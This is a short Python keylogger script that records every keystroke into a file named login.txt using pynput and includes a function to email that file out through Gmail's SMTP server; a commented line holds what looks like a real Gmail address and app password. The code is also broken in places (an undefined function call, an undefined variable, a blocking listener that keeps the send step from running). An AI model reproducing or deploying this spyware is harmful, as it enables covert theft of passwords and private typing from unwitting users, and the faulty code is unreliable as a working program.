import smtplib
import time
from pynput.keyboard import Listener
from email.message import EmailMessage
#The keylogger function to record the key strokes in login.txt file
def write_to_file(key):
    letter=str(key)
    letter=letter.replace("'","")
    letter = letter.replace("\x16Key.backspaceKey.backspaceetterKey.backspaceKey.", "")
    if letter =='Key.space':
        letter=' '
    if letter=='Key.shift_r':
        letter=''
    if letter=='Key.ctrl_l':
        letter=""
    if letter =='Key.enter':
        letter="\n"
    if letter =='Key.delete':
        letter=' '
    if letter=='Key.backspace':
        letter=''
    with open("login.txt",'a') as f:
        f.write(letter)
with Listener(on_press=write_to_file) as l:
    l.join()

#to send the login.txt file to email 
def send_mail():
    msg = EmailMessage()
    msg["From"] = 'senderEmail'
    msg["Subject"] = "Test"
    msg["To"] ='ReceiverEmail'
    msg.set_content("This is the message body")
    #you can attach the file in the place"login.txt"
    msg.add_attachment(open("login.txt", "r").read(), filename="login.txt")
        
        # Set up the SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    
    # Replace 'YOUR_APP_SPECIFIC_PASSWORD' with the generated app-specific password
    app_specific_password = 'your gmail password'
    
    # Log in with the app-specific password
    server.login('sender_mail_address', app_specific_password)
    #server.login('adityayandolipq0@gmail.com','kgul duqk cdta wvzx')
    
    # Sending the email
    server.sendmail('sender_mail_address','receiver_mail_address',file_data)
    print('Mail sent')
    
    # Quit the server
    server.quit()

   

# Call your listener function here...
with Listener(on_press=write_to_file) as l:
    # Run the listener indefinitely
    l.join()

# After a certain time (for example, 60 seconds), send the email
time.sleep(60)  # Wait for 60 seconds
send_email()
